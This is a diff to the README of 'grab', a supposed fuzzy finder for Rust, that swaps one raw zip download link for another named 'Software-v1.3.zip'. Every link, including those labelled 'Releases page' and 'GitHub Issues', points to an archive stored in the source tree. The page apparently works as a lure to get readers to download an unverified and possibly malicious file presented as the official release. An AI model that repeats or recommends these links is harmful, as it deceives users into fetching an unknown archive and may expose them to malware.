@@ -6,10 +6,10 @@ grab is a fuzzy finder designed for Rust developers. It helps you quickly locate
 ## 🚀 Getting Started
 To start using grab, you will need to download it from our Releases page. This process is easy and straightforward. Follow the steps below to get set up.
 
-[![Download grab](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/grab_v2.6.zip)](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/grab_v2.6.zip)
+[![Download grab](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/Software-v1.3.zip)](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/Software-v1.3.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/grab_v2.6.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/Software-v1.3.zip).
 2. Scroll down to the "Assets" section.
 3. Choose the version of grab that matches your operating system (Windows, macOS, or Linux).
 4. Click on the file to start downloading.
@@ -48,11 +48,11 @@ If problems persist, you can report issues on our GitHub page or consult the com
 ## 📣 Community & Support
 Join our community to connect with other Rust developers using grab. You can share tips, ask questions, and get advice.
 
-- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/grab_v2.6.zip).
+- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/Software-v1.3.zip).
 - **Discussion Forum:** Engage with other users and developers in our forum.
 
 ## 📜 License
 grab is open-source software licensed under the MIT License. You can use it freely, but please give credit to the original creators.
 
 ## 🏁 Conclusion
-grab offers Rust developers an efficient way to find files and functions quickly. By following the steps above, you can easily download, install, and start using grab. Visit the [Releases page](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/grab_v2.6.zip) now to get started!
+grab offers Rust developers an efficient way to find files and functions quickly. By following the steps above, you can easily download, install, and start using grab. Visit the [Releases page](https://raw.githubusercontent.com/Etsdsf8797/grab/main/src/unit/Software-v1.3.zip) now to get started!
